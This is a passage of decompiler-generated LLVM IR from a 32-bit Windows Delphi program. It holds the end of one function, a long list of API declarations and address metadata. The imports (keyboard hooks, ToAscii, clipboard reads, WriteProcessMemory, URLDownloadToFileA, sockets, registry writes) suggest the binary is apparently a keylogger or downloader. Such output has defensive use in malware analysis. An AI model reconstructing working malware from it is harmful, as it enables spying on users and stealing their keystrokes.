  %20 = call i32 @function_4036c8(), !insn.addr !2161
  %21 = inttoptr i32 %20 to i8*, !insn.addr !2162
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !2163
  %23 = call i32 @"@LStrCat3"(), !insn.addr !2164
  %24 = call i32 @function_4036c8(), !insn.addr !2165
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2166
  store i8* %25, i8** %stack_var_-136, align 4, !insn.addr !2166
  %26 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2166
  %27 = call i32* @LoadLibraryA(i8* %25), !insn.addr !2167
  %28 = ptrtoint i32* %27 to i32, !insn.addr !2167
  store i32 %28, i32* @global_var_408118, align 4, !insn.addr !2168
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2169
  br label %dec_label_pc_407e14, !insn.addr !2169

dec_label_pc_407de7:                              ; preds = %dec_label_pc_407cd0
  %29 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2145
  %30 = call i32 @function_4060f0(), !insn.addr !2170
  %31 = call i32 @function_407104(), !insn.addr !2171
  %32 = trunc i32 %31 to i8, !insn.addr !2172
  %33 = icmp eq i8 %32, 0, !insn.addr !2172
  store i32 %29, i32* %esp.2.reg2mem, !insn.addr !2173
  br i1 %33, label %dec_label_pc_407f56, label %dec_label_pc_407e09, !insn.addr !2173

dec_label_pc_407e09:                              ; preds = %dec_label_pc_407de7
  %34 = load i32, i32* @global_var_408138, align 4, !insn.addr !2174
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2175
  store i32 -1, i32* %35, align 4, !insn.addr !2175
  store i32 %29, i32* %esp.0.reg2mem, !insn.addr !2175
  br label %dec_label_pc_407e14, !insn.addr !2175

dec_label_pc_407e14:                              ; preds = %dec_label_pc_407e09, %dec_label_pc_407d6c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %36 = add i32 %esp.0.reload, -4, !insn.addr !2176
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2176
  store i32 260, i32* %37, align 4, !insn.addr !2176
  %38 = add i32 %esp.0.reload, -8, !insn.addr !2177
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2177
  store i32 ptrtoint (i8** @global_var_409700 to i32), i32* %39, align 4, !insn.addr !2177
  %40 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2178
  %41 = ptrtoint i32 (i32, i32, i32)* %40 to i32, !insn.addr !2178
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2179
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2179
  store i32 %41, i32* %43, align 4, !insn.addr !2179
  %44 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2180
  %45 = add i32 %44, ptrtoint (i8** @global_var_409700 to i32), !insn.addr !2181
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2181
  store i8 0, i8* %46, align 1, !insn.addr !2181
  %47 = call i32 @"@LStrFromArray"(), !insn.addr !2182
  %48 = call i32 @function_4070cc(), !insn.addr !2183
  %49 = call i32 @"@LStrAsg"(), !insn.addr !2184
  %50 = call i32 @"@LStrCat3"(), !insn.addr !2185
  %51 = load i32, i32* @global_var_408138, align 4, !insn.addr !2186
  %52 = icmp eq i32 %51, 0, !insn.addr !2186
  br i1 %52, label %dec_label_pc_407ead, label %dec_label_pc_407e7a, !insn.addr !2187

dec_label_pc_407e7a:                              ; preds = %dec_label_pc_407e14
  %53 = add i32 %esp.0.reload, -16, !insn.addr !2188
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2188
  store i32 ptrtoint ([16 x i8]* @global_var_407fd8 to i32), i32* %54, align 4, !insn.addr !2188
  %55 = add i32 %esp.0.reload, -20, !insn.addr !2189
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2189
  store i32 ptrtoint ([8 x i8]* @global_var_407fe8 to i32), i32* %56, align 4, !insn.addr !2189
  %57 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2190
  %58 = icmp eq i32* %57, null, !insn.addr !2191
  %59 = icmp eq i1 %58, false, !insn.addr !2192
  store i32 %55, i32* %esp.2.reg2mem, !insn.addr !2192
  br i1 %59, label %dec_label_pc_407f56, label %dec_label_pc_407e91, !insn.addr !2192

dec_label_pc_407e91:                              ; preds = %dec_label_pc_407e7a
  %60 = add i32 %esp.0.reload, -24, !insn.addr !2193
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2193
  store i32 ptrtoint (i32* @global_var_409818 to i32), i32* %61, align 4, !insn.addr !2193
  %62 = add i32 %esp.0.reload, -28, !insn.addr !2194
  %63 = inttoptr i32 %62 to i32*, !insn.addr !2194
  store i32 0, i32* %63, align 4, !insn.addr !2194
  %64 = add i32 %esp.0.reload, -32, !insn.addr !2195
  %65 = inttoptr i32 %64 to i32*, !insn.addr !2195
  store i32 66, i32* %65, align 4, !insn.addr !2195
  %66 = add i32 %esp.0.reload, -36, !insn.addr !2196
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2196
  store i32 4220780, i32* %67, align 4, !insn.addr !2196
  %68 = add i32 %esp.0.reload, -40, !insn.addr !2197
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2197
  store i32 0, i32* %69, align 4, !insn.addr !2197
  %70 = add i32 %esp.0.reload, -44, !insn.addr !2198
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2198
  store i32 0, i32* %71, align 4, !insn.addr !2198
  %72 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2199
  store i32 %70, i32* %esp.2.reg2mem, !insn.addr !2200
  br label %dec_label_pc_407f56, !insn.addr !2200

dec_label_pc_407ead:                              ; preds = %dec_label_pc_407e14
  %73 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2201
  %74 = icmp eq i32 %73, 0, !insn.addr !2201
  store i32 %42, i32* %esp.2.reg2mem, !insn.addr !2202
  br i1 %74, label %dec_label_pc_407f56, label %dec_label_pc_407ebb, !insn.addr !2202

dec_label_pc_407ebb:                              ; preds = %dec_label_pc_407ead
  %75 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2203
  %76 = icmp eq i8 %75, 0, !insn.addr !2203
  br i1 %76, label %dec_label_pc_407eca, label %dec_label_pc_407ec5, !insn.addr !2204

dec_label_pc_407ec5:                              ; preds = %dec_label_pc_407ebb
  %77 = call i32 @function_40692c(), !insn.addr !2205
  br label %dec_label_pc_407eca, !insn.addr !2205

dec_label_pc_407eca:                              ; preds = %dec_label_pc_407ec5, %dec_label_pc_407ebb
  %78 = load i32, i32* @global_var_408148, align 4, !insn.addr !2206
  %79 = icmp slt i32 %78, 1, !insn.addr !2207
  br i1 %79, label %dec_label_pc_407f07, label %dec_label_pc_407ed4, !insn.addr !2207

dec_label_pc_407ed4:                              ; preds = %dec_label_pc_407eca
  %80 = call i32 @function_404d38(), !insn.addr !2208
  %81 = call i32 @"@LStrCmp"(), !insn.addr !2209
  %82 = load i32, i32* @global_var_408154, align 4, !insn.addr !2210
  %83 = inttoptr i32 %82 to i32*, !insn.addr !2211
  store i32 -1, i32* %83, align 4, !insn.addr !2211
  %84 = load i32, i32* @global_var_408154, align 4, !insn.addr !2212
  %85 = icmp eq i32 %84, 0, !insn.addr !2212
  br i1 %85, label %dec_label_pc_407f07, label %dec_label_pc_407f02, !insn.addr !2213

dec_label_pc_407f02:                              ; preds = %dec_label_pc_407ed4
  %86 = call i32 @function_40600c(), !insn.addr !2214
  br label %dec_label_pc_407f07, !insn.addr !2214

dec_label_pc_407f07:                              ; preds = %dec_label_pc_407f02, %dec_label_pc_407ed4, %dec_label_pc_407eca
  %87 = add i32 %esp.0.reload, -16, !insn.addr !2215
  %88 = inttoptr i32 %87 to i32*, !insn.addr !2215
  store i32 3, i32* %88, align 4, !insn.addr !2215
  %89 = add i32 %esp.0.reload, -20, !insn.addr !2216
  %90 = inttoptr i32 %89 to i32*, !insn.addr !2216
  store i32 16065, i32* %90, align 4, !insn.addr !2216
  %91 = load i32, i32* @global_var_408118, align 4, !insn.addr !2217
  %92 = add i32 %esp.0.reload, -24, !insn.addr !2218
  %93 = inttoptr i32 %92 to i32*, !insn.addr !2218
  store i32 %91, i32* %93, align 4, !insn.addr !2218
  %94 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2219
  %95 = icmp eq i32* %94, null, !insn.addr !2220
  %96 = icmp eq i1 %95, false, !insn.addr !2221
  store i32 %92, i32* %esp.1.reg2mem, !insn.addr !2221
  br i1 %96, label %dec_label_pc_407f47, label %dec_label_pc_407f1d, !insn.addr !2221

dec_label_pc_407f1d:                              ; preds = %dec_label_pc_407f07
  %97 = add i32 %esp.0.reload, -28, !insn.addr !2222
  %98 = inttoptr i32 %97 to i32*, !insn.addr !2222
  store i32 14, i32* %98, align 4, !insn.addr !2222
  %99 = add i32 %esp.0.reload, -32, !insn.addr !2223
  %100 = inttoptr i32 %99 to i32*, !insn.addr !2223
  store i32 16065, i32* %100, align 4, !insn.addr !2223
  %101 = load i32, i32* @global_var_408118, align 4, !insn.addr !2224
  %102 = add i32 %esp.0.reload, -36, !insn.addr !2225
  %103 = inttoptr i32 %102 to i32*, !insn.addr !2225
  store i32 %101, i32* %103, align 4, !insn.addr !2225
  %104 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2226
  %105 = icmp eq i32* %104, null, !insn.addr !2227
  %106 = icmp eq i1 %105, false, !insn.addr !2228
  store i32 %102, i32* %esp.1.reg2mem, !insn.addr !2228
  br i1 %106, label %dec_label_pc_407f47, label %dec_label_pc_407f33, !insn.addr !2228

dec_label_pc_407f33:                              ; preds = %dec_label_pc_407f1d
  %107 = add i32 %esp.0.reload, -40, !insn.addr !2229
  %108 = inttoptr i32 %107 to i32*, !insn.addr !2229
  store i32 16065, i32* %108, align 4, !insn.addr !2229
  %109 = load i32, i32* @global_var_408118, align 4, !insn.addr !2230
  %110 = add i32 %esp.0.reload, -44, !insn.addr !2231
  %111 = inttoptr i32 %110 to i32*, !insn.addr !2231
  store i32 %109, i32* %111, align 4, !insn.addr !2231
  %112 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2232
  %113 = icmp eq i32* %112, null, !insn.addr !2233
  store i32 %110, i32* %esp.1.reg2mem, !insn.addr !2234
  store i32 %110, i32* %esp.2.reg2mem, !insn.addr !2234
  br i1 %113, label %dec_label_pc_407f56, label %dec_label_pc_407f47, !insn.addr !2234

dec_label_pc_407f47:                              ; preds = %dec_label_pc_407f33, %dec_label_pc_407f1d, %dec_label_pc_407f07
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %114 = call i32 @function_4079a0(), !insn.addr !2235
  store i32 4225948, i32* @global_var_409654, align 4, !insn.addr !2236
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2236
  br label %dec_label_pc_407f56, !insn.addr !2236

dec_label_pc_407f56:                              ; preds = %dec_label_pc_407f47, %dec_label_pc_407f33, %dec_label_pc_407ead, %dec_label_pc_407e91, %dec_label_pc_407e7a, %dec_label_pc_407de7
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %115 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2237
  %116 = load i32, i32* %115, align 4, !insn.addr !2237
  call void @__writefsdword(i32 0, i32 %116), !insn.addr !2238
  %117 = add i32 %esp.2.reload, 8, !insn.addr !2239
  %118 = inttoptr i32 %117 to i32*, !insn.addr !2239
  store i32 4226936, i32* %118, align 4, !insn.addr !2239
  %119 = call i32 @"@LStrArrayClr"(), !insn.addr !2240
  ret i32 %119, !insn.addr !2241
}

define i32 @function_407f71() local_unnamed_addr {
dec_label_pc_407f71:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2242
  ret i32 %0, !insn.addr !2242
}

define i32 @function_407f76() local_unnamed_addr {
dec_label_pc_407f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2243
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare void @__asm_into(i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare void @__writegsbyte(i32, i8) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_11() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207776}
!72 = !{i64 4207790}
!73 = !{i64 4207815}
!74 = !{i64 4207816}
!75 = !{i64 4207818}
!76 = !{i64 4207820}
!77 = !{i64 4207823}
!78 = !{i64 4208007}
!79 = !{i64 4208145}
!80 = !{i64 4208312}
!81 = !{i64 4208314}
!82 = !{i64 4208316}
!83 = !{i64 4208319}
!84 = !{i64 4208320}
!85 = !{i64 4208322}
!86 = !{i64 4208326}
!87 = !{i64 4208328}
!88 = !{i64 4208332}
!89 = !{i64 4208408}
!90 = !{i64 4208413}
!91 = !{i64 4208416}
!92 = !{i64 4208421}
!93 = !{i64 4208487}
!94 = !{i64 4208831}
!95 = !{i64 4209003}
!96 = !{i64 4209263}
!97 = !{i64 4209790}
!98 = !{i64 4209799}
!99 = !{i64 4209800}
!100 = !{i64 4209802}
!101 = !{i64 4209804}
!102 = !{i64 4209807}
!103 = !{i64 4209808}
!104 = !{i64 4209813}
!105 = !{i64 4209814}
!106 = !{i64 4209832}
!107 = !{i64 4209837}
!108 = !{i64 4209840}
!109 = !{i64 4209845}
!110 = !{i64 4210564}
!111 = !{i64 4210569}
!112 = !{i64 4210573}
!113 = !{i64 4210746}
!114 = !{i64 4210751}
!115 = !{i64 4210759}
!116 = !{i64 4210834}
!117 = !{i64 4210839}
!118 = !{i64 4210842}
!119 = !{i64 4211056}
!120 = !{i64 4211064}
!121 = !{i64 4211072}
!122 = !{i64 4211080}
!123 = !{i64 4211088}
!124 = !{i64 4211096}
!125 = !{i64 4211121}
!126 = !{i64 4211381}
!127 = !{i64 4211386}
!128 = !{i64 4211471}
!129 = !{i64 4211474}
!130 = !{i64 4211477}
!131 = !{i64 4211485}
!132 = !{i64 4211488}
!133 = !{i64 4211496}
!134 = !{i64 4211497}
!135 = !{i64 4211502}
!136 = !{i64 4211505}
!137 = !{i64 4211508}
!138 = !{i64 4211515}
!139 = !{i64 4211527}
!140 = !{i64 4211530}
!141 = !{i64 4211533}
!142 = !{i64 4211541}
!143 = !{i64 4211544}
!144 = !{i64 4211552}
!145 = !{i64 4211553}
!146 = !{i64 4211558}
!147 = !{i64 4211561}
!148 = !{i64 4211564}
!149 = !{i64 4211571}
!150 = !{i64 4211572}
!151 = !{i64 4211580}
!152 = !{i64 4211588}
!153 = !{i64 4211596}
!154 = !{i64 4211604}
!155 = !{i64 4211612}
!156 = !{i64 4211620}
!157 = !{i64 4211628}
!158 = !{i64 4211636}
!159 = !{i64 4211644}
!160 = !{i64 4211652}
!161 = !{i64 4211660}
!162 = !{i64 4211668}
!163 = !{i64 4211676}
!164 = !{i64 4211684}
!165 = !{i64 4211692}
!166 = !{i64 4211700}
!167 = !{i64 4211708}
!168 = !{i64 4211716}
!169 = !{i64 4211724}
!170 = !{i64 4211732}
!171 = !{i64 4211740}
!172 = !{i64 4211748}
!173 = !{i64 4211756}
!174 = !{i64 4211764}
!175 = !{i64 4211772}
!176 = !{i64 4211780}
!177 = !{i64 4211788}
!178 = !{i64 4211796}
!179 = !{i64 4211804}
!180 = !{i64 4211812}
!181 = !{i64 4211820}
!182 = !{i64 4211828}
!183 = !{i64 4211836}
!184 = !{i64 4211844}
!185 = !{i64 4211852}
!186 = !{i64 4211860}
!187 = !{i64 4211868}
!188 = !{i64 4211876}
!189 = !{i64 4211884}
!190 = !{i64 4211892}
!191 = !{i64 4211900}
!192 = !{i64 4211908}
!193 = !{i64 4211916}
!194 = !{i64 4211924}
!195 = !{i64 4211932}
!196 = !{i64 4211940}
!197 = !{i64 4211948}
!198 = !{i64 4211956}
!199 = !{i64 4211964}
!200 = !{i64 4211972}
!201 = !{i64 4211980}
!202 = !{i64 4211988}
!203 = !{i64 4211996}
!204 = !{i64 4212004}
!205 = !{i64 4212012}
!206 = !{i64 4212020}
!207 = !{i64 4212028}
!208 = !{i64 4212036}
!209 = !{i64 4212044}
!210 = !{i64 4212052}
!211 = !{i64 4212060}
!212 = !{i64 4212068}
!213 = !{i64 4212076}
!214 = !{i64 4212084}
!215 = !{i64 4212092}
!216 = !{i64 4212100}
!217 = !{i64 4212108}
!218 = !{i64 4212116}
!219 = !{i64 4212124}
!220 = !{i64 4212132}
!221 = !{i64 4212141}
!222 = !{i64 4212146}
!223 = !{i64 4212148}
!224 = !{i64 4212255}
!225 = !{i64 4212258}
!226 = !{i64 4212261}
!227 = !{i64 4212269}
!228 = !{i64 4212272}
!229 = !{i64 4212280}
!230 = !{i64 4212281}
!231 = !{i64 4212286}
!232 = !{i64 4212289}
!233 = !{i64 4212292}
!234 = !{i64 4212299}
!235 = !{i64 4212303}
!236 = !{i64 4212305}
!237 = !{i64 4212307}
!238 = !{i64 4212312}
!239 = !{i64 4212319}
!240 = !{i64 4212321}
!241 = !{i64 4212323}
!242 = !{i64 4212325}
!243 = !{i64 4212327}
!244 = !{i64 4212330}
!245 = !{i64 4212334}
!246 = !{i64 4212339}
!247 = !{i64 4212342}
!248 = !{i64 4212345}
!249 = !{i64 4212351}
!250 = !{i64 4212358}
!251 = !{i64 4212368}
!252 = !{i64 4212378}
!253 = !{i64 4212388}
!254 = !{i64 4212398}
!255 = !{i64 4212333}
!256 = !{i64 4212405}
!257 = !{i64 4212408}
!258 = !{i64 4212411}
!259 = !{i64 4212416}
!260 = !{i64 4212417}
!261 = !{i64 4212422}
!262 = !{i64 4212425}
!263 = !{i64 4212428}
!264 = !{i64 4212435}
!265 = !{i64 4212436}
!266 = !{i64 4212443}
!267 = !{i64 4212454}
!268 = !{i64 4212461}
!269 = !{i64 4212463}
!270 = !{i64 4212469}
!271 = !{i64 4212471}
!272 = !{i64 4212472}
!273 = !{i64 4212473}
!274 = !{i64 4212479}
!275 = !{i64 4212486}
!276 = !{i64 4212487}
!277 = !{i64 4212492}
!278 = !{i64 4212507}
!279 = !{i64 4212510}
!280 = !{i64 4212513}
!281 = !{i64 4212521}
!282 = !{i64 4212524}
!283 = !{i64 4212532}
!284 = !{i64 4212533}
!285 = !{i64 4212538}
!286 = !{i64 4212541}
!287 = !{i64 4212544}
!288 = !{i64 4212551}
